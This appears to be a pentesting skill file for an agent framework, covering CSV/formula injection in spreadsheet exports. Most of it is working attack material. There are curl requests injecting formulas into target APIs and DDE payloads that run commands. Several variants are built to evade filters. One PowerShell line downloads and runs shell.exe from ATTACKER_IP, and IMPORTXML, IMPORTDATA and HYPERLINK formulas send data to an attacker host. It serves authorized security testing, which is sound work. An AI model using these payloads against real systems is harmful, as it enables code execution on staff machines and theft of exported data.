---
name: attack-csv-injection
description: "CSV/Formula Injection — DDE/formula execution and blind data exfiltration when untrusted input is exported into CSV/Excel/Google Sheets"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - csv-injection
  - formula-injection
  - dde
  - excel
  - export
  - attack
tech_stack:
  - web
  - excel
  - google-sheets
  - libreoffice
cwe_ids:
  - CWE-1236
chains_with:
  - wstg-busl-01
prerequisites: []
severity_boost:
  wstg-busl-01: "Business-logic export feature confirmed by WSTG-BUSL-01 = reliable delivery vector for weaponized CSV to internal staff"
---

# CSV / Formula Injection

## Objective

Inject spreadsheet formulas into user-controlled fields (name, address, comments, invoice line items) that get exported to CSV/XLSX, so that when a victim (staff/admin) opens the file in Excel, LibreOffice, or Google Sheets, the formula executes — enabling remote command execution via DDE or blind data exfiltration via remote-import formulas.

## Testing Methodology

### Phase 1: Identify Export Points

Look for any feature that lets user input flow into a downloadable CSV/XLSX/Google Sheets export:
- Invoice/order line items, billing address, "notes"/"comments" fields
- User profile fields shown in an admin "export users" report
- Contact forms, support tickets, survey responses later exported by staff

```bash
# Set the vulnerable field to a formula payload via the normal app API
curl -s -X POST "https://TARGET/api/profile" \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" \
  --data '{"full_name":"=2+5+cmd|'"'"' /C calc'"'"'!A0"}'
```

### Phase 2: Confirm Injection Point Is Unescaped

```bash
# Any of these prefix characters trigger formula evaluation in most spreadsheet apps:
# =   +   -   @   (also tab \t and carriage return \r in some parsers)
curl -s -X POST "https://TARGET/api/comment" --data '{"comment":"=1+1"}'

# Download the export and check the raw CSV — value must appear WITHOUT a leading
# apostrophe/quote-escape and without the formula characters being stripped
curl -s "https://TARGET/api/export.csv" -H "Authorization: Bearer YOUR_SESSION_TOKEN" -o export.csv
grep -n '^=' export.csv
```

### Phase 3: DDE Command Execution Payloads

```text
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=cmd|' /C calc'!'A1'
```

```text
# PowerShell download-and-execute (staged payload on attacker infra)
=cmd|'/C powershell IEX(wget http://ATTACKER_IP/shell.exe)'!A0
```

```text
# Obfuscated prefix to dodge naive "starts with =+-@" filters
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A
```

```text
# rundll32 instead of cmd (bypasses cmd-string blocklists)
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
```

```text
# Null/whitespace-padded characters to defeat dictionary/word filters
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

### Phase 4: Blind Exfiltration via Google Sheets Import Formulas

```text
# If the export is opened/imported directly into Google Sheets, these formulas
# fetch a remote URL — usable for OOB confirmation and data theft
=IMPORTXML("http://ATTACKER_IP/csv", "//a/@href")
=IMPORTDATA("http://ATTACKER_IP/csv")
=IMPORTHTML("http://ATTACKER_IP/csv", "table", 1)
=IMPORTFEED("http://ATTACKER_IP/csv")
```

```bash
# Start a listener to catch the callback (Google Sheets will prompt the user for
# authorization before fetching — note this in your report as a UX mitigation)
attack_script generic_listener -p 80 -o csv_exfil_evidence.json
```

### Phase 5: Hyperlink-Based Exfiltration (Excel/LibreOffice)

```text
=HYPERLINK("http://ATTACKER_IP/leak?d="&A1&A2,"Click for details")
```

## What Constitutes a Finding

| Finding | Severity |
|---|---|
| DDE/formula payload achieves command execution when file opened by staff | Critical (P1) |
| Unescaped formula characters (`=`,`+`,`-`,`@`) reach the exported file unsanitized | High (P2) |
| Blind exfiltration confirmed via IMPORTXML/IMPORTDATA OOB callback | Medium (P3) |
| Hyperlink-based data exfiltration formula accepted | Medium (P3) |

## Evidence Requirements

- Raw exported CSV/XLSX showing the unescaped formula in the affected column
- Screenshot of the payload executing (calc.exe popup, PowerShell reverse shell) or
  OOB callback log entry (`csv_exfil_evidence.json`)
- Description of the exact field/API used to inject the payload and the export
  workflow (who downloads/opens the file, and how often)

## Tools

- `attack_script generic_listener` — OOB callback listener for exfil formulas
- Burp Repeater / `curl` — inject payload into export-bound fields
- Excel/LibreOffice Calc (sandboxed VM) — validate DDE execution before reporting

## References

- [PayloadsAllTheThings: CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)
- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [From CSV to Meterpreter - Adam Chester](https://blog.xpnsec.com/from-csv-to-meterpreter/)
- [The Absurdly Underestimated Dangers of CSV Injection - George Mauer](https://georgemauer.net/2017/10/07/csv-injection.html)
